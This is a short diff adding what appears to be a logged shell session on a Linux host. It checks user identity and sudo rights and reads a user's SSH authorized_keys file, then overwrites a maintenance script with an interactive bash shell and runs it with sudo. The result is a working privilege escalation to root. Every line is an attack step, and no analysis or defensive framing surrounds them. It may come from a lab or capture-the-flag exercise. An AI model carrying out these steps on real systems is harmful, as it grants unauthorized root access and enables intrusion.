@@ -1,0 +1,16 @@
+id
+whoami
+pwd
+ls -la /home/devops/
+cat /home/devops/.ssh/authorized_keys
+sudo -l
+ls -la /opt/maintenance/
+cat /opt/maintenance/run-diagnostics.sh
+ls -la /opt/maintenance/run-diagnostics.sh
+groups
+id
+cp /opt/maintenance/run-diagnostics.sh /opt/maintenance/run-diagnostics.sh.bak
+echo '#!/bin/bash' > /opt/maintenance/run-diagnostics.sh
+echo '/bin/bash -i' >> /opt/maintenance/run-diagnostics.sh
+chmod +x /opt/maintenance/run-diagnostics.sh
+sudo /opt/maintenance/run-diagnostics.sh
